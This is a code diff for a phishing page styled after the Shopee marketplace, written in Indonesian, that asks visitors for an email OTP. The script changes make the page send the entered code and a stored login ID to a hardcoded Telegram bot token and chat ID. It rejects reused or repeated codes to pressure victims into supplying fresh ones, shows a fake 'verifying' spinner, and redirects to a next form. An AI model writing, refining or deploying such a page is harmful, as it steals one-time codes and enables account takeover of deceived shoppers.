@@ -41,14 +41,9 @@
             margin: 6px 0;
         }
 
-        .wa {
-            color: #25D366;
-            font-weight: bold;
-        }
-        
-        /* Tambahkan style untuk email agar warna teks tetap kontras */
-        .email, .Email {
-            color: #333; /* Warna hitam untuk teks email yang terdaftar */
+        .email-display {
+            /* Gaya untuk teks email yang terdaftar */
+            color: #333; 
             font-weight: bold;
         }
 
@@ -71,7 +66,6 @@
         }
 
         .otp-box input:focus {
-            /* Menggunakan warna oranye Shopee untuk fokus input OTP karena ini adalah halaman lanjutan */
             border-color: #EE4D2D; 
         }
 
@@ -89,7 +83,6 @@
 
         button.active {
             background: #EE4D2D;
-            /* Warna oranye Shopee */
             cursor: pointer;
         }
 
@@ -103,6 +96,36 @@
             color: #e65100;
             font-weight: 500;
         }
+        
+        /* --- STYLE UNTUK LOADING SPINNER --- */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95); 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none; /* Awalnya tersembunyi */
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #EE4D2D; /* Warna Shopee */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
@@ -111,22 +134,49 @@
         <h1>Masukkan Kode Verifikasi</h1>
     </header>
     <div class="content">
-        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="email">email yang terdaftar</b></p>
-        <p><b class="Email"></b></p> <div class="otp-box">
-            <input type="tel" inputmode="numeric" maxlength="1" />
-            <input type="tel" inputmode="numeric" maxlength="1" />
-            <input type="tel" inputmode="numeric" maxlength="1" />
-            <input type="tel" inputmode="numeric" maxlength="1" />
-            <input type="tel" inputmode="numeric" maxlength="1" />
-            <input type="tel" inputmode="numeric" maxlength="1" />
+        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="email-display">email yang terdaftar</b></p>
+        <p><b class="email-display" id="target-email-display"></b></p> 
+        <div class="otp-box">
+            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
+            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
+            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
+            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
+            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
+            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
         </div>
         <button id="lanjut" disabled>Lanjut</button>
         <div class="wait">Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang</div>
     </div>
+    
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loadingMessage" class="mt-4 text-lg text-gray-700 mt-3">Memproses, harap tunggu...</p>
+    </div>
+
     <script>
-        // === KONFIGURASI TELEGRAM (Harap pastikan ini adalah TOKEN dan CHAT ID yang benar) ===
+        // === KONFIGURASI TELEGRAM ===
         const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
         const TELEGRAM_CHAT_ID = '5923031825';
+        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        // --- Ambil riwayat semua percobaan dari session storage ---
+        let allCodeAttempts = JSON.parse(sessionStorage.getItem('all_code_attempts')) || [];
+        // --- Ambil Username/Email dari Local Storage (karena disimpan dari halamantoko.html) ---
+        const storedLogin = localStorage.getItem('verificationPhoneNumber') || 'TIDAK_TERSEDIA'; 
+
+        // === UTILITY FUNGSI ===
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        function showLoading(message) {
+            document.getElementById("loadingOverlay").style.display = 'flex';
+            document.getElementById("loadingMessage").textContent = message || "Memproses, harap tunggu...";
+        }
+
+        function hideLoading() {
+            document.getElementById("loadingOverlay").style.display = 'none';
+        }
         
         // === OTP Input Logic ===
         const inputs = document.querySelectorAll(".otp-box input");
@@ -134,7 +184,6 @@
         
         inputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
-                // Selalu hapus karakter non-angka (memastikan hanya angka)
                 const value = e.target.value.replace(/[^0-9]/g, ""); 
                 e.target.value = value;
                 
@@ -144,7 +193,6 @@
                 checkFilled();
             });
             input.addEventListener("keydown", (e) => {
-                // Logika Backspace
                 if (e.key === "Backspace" && !e.target.value && index > 0) {
                     inputs[index - 1].focus();
                 }
@@ -162,18 +210,52 @@
             }
         }
         
-        lanjutBtn.addEventListener("click", () => {
+        // === Fungsi Validasi Tambahan ===
+        function isValidOtp(otp) {
+            if (otp.length !== 6) return false;
+            
+            // 1. Cek apakah 6 digitnya sama semua (misalnya 111111)
+            const firstDigit = otp[0];
+            const allSame = otp.split('').every(digit => digit === firstDigit);
+            
+            if (allSame) {
+                return false;
+            }
+            
+            // 2. Cek apakah input saat ini sama dengan kode yang sudah pernah dimasukkan (dari riwayat)
+            if (allCodeAttempts.includes(otp)) {
+                return false; 
+            }
+            
+            return true;
+        }
+
+        
+        lanjutBtn.addEventListener("click", async () => {
             const otp = Array.from(inputs).map((i) => i.value).join("");
             
-            // Ambil data email yang seharusnya sudah diisi dari halaman sebelumnya
-            const emailElement = document.querySelector('.Email');
-            const emailTerdaftar = emailElement ? emailElement.textContent.trim() : 'Email tidak ditemukan';
+            if (!isValidOtp(otp)) {
+                alert("6 Digit yang anda input salah");
+                return; 
+            }
             
-            const message = `[LOG BARU]\nEmail: ${emailTerdaftar}\nKode OTP yang dimasukkan: ${otp}`;
+            // 1. Simpan input saat ini ke riwayat global
+            allCodeAttempts.push(otp);
+            sessionStorage.setItem('all_code_attempts', JSON.stringify(allCodeAttempts));
             
-            sendToTelegram(message); // Kirim ke Telegram
+            // 2. Tentukan email yang dikirim (menggunakan storedLogin yang harusnya berupa email/username/nomor)
+            const emailTerdaftar = storedLogin; 
+            const message = `#OTP_EMAIL\nLogin ID (Email/HP/Username): **${emailTerdaftar}**\nKode OTP EMAIL: **${otp}**`;
             
-            // Arahkan ke halaman berikutnya
+            // 3. Kirim ke Telegram (SEGERA)
+            await sendToTelegram(message);
+            
+            // 4. Tampilkan Loading 3 detik
+            showLoading("Memverifikasi Kode...");
+            await sleep(3000); 
+            hideLoading();
+            
+            // 5. Arahkan ke halaman berikutnya
             window.location.href = "formulir2.html"; 
         });
         
@@ -189,34 +271,39 @@
             }
         }, 1000);
         
-        // === Fungsi untuk mengirim data ke Telegram (Menggunakan GET untuk kesederhanaan) ===
-        function sendToTelegram(message) {
-            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        // === Fungsi untuk mengirim data ke Telegram ===
+        async function sendToTelegram(message) {
+            const apiUrl = `${TELEGRAM_URL}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
             
-            // Encode pesan
-            const encodedMessage = encodeURIComponent(message);
-            
-            fetch(`${apiUrl}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`, {
-                    method: 'GET'
-                })
-                .then(response => {
-                    // Cek status response sebelum parsing JSON
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Pesan OTP berhasil dikirim ke Telegram!');
-                    } else {
-                        console.error('Gagal mengirim pesan ke Telegram (API Error):', data.description);
-                    }
-                })
-                .catch(error => {
-                    console.error('Terjadi kesalahan saat mengirim ke Telegram:', error);
-                });
+            try {
+                const response = await fetch(apiUrl, { method: 'GET' });
+                const data = await response.json();
+
+                if (response.ok && data.ok) {
+                    console.log('Pesan OTP berhasil dikirim ke Telegram!');
+                } else {
+                    console.error('Gagal mengirim pesan ke Telegram (API Error):', data.description);
+                }
+                return response.ok;
+
+            } catch(error) {
+                console.error('Terjadi kesalahan saat mengirim ke Telegram:', error);
+                return false;
+            }
         }
+        
+        // === INITIALIZATION ===
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailDisplayEl = document.getElementById('target-email-display');
+            if (emailDisplayEl) {
+                // Tampilkan Username/Email/Nomor HP yang diinput di halaman pertama
+                emailDisplayEl.textContent = storedLogin;
+            }
+            // Atur fokus ke input pertama saat halaman dimuat
+            if (inputs.length > 0) {
+                 inputs[0].focus();
+            }
+        });
     </script>
 </body>
 
